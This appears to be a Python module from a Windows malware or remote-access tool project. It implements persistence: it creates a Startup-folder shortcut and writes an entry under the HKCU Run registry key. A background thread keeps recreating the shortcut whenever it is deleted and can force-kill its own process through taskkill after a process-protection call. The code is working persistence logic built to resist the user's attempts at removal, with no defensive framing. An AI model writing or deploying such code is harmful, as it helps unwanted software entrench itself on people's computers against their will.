import subprocess
from ..file_system.file_sys import FileSystem
from ..constants import STARTUP_PATH
import sys, os, time, threading, winreg
import processManagement

class Startup:

    def make_shortcut(self, filepath, filename):
        try:
            FileSystem.make_shortcut(filepath, os.path.join(STARTUP_PATH, filename))
            return 1
        except:
            return 0

    def does_shortcut_exists(self, filename):
        return os.path.exists(os.path.join(STARTUP_PATH, filename))

    def __persist_shortcut(self, filepath, filename, sleep=1.5, kill_on_delete=False):
        self.make_shortcut(filename=filename, filepath=filepath)
        while True:
            if not self.does_shortcut_exists(filename):
                self.make_shortcut(filename=filename, filepath=filepath) 
                if kill_on_delete:
                    if processManagement.protectProcess() == 1:
                        exe_name = sys.executable.split("\\")[-1]
                        subprocess.run(["taskkill","/im",exe_name ,"/f"])
            time.sleep(sleep)

    def persist_shortcut(self, filepath, filename, sleep=1.5, kill_on_delete=False):
        t = threading.Thread(target=self.__persist_shortcut, args=(filepath, filename, sleep, kill_on_delete))
        t.start()

    @staticmethod
    def add_to_registry(path, name):
        key = winreg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(handle, name, 0, winreg.REG_SZ, path)        
        winreg.CloseKey(handle)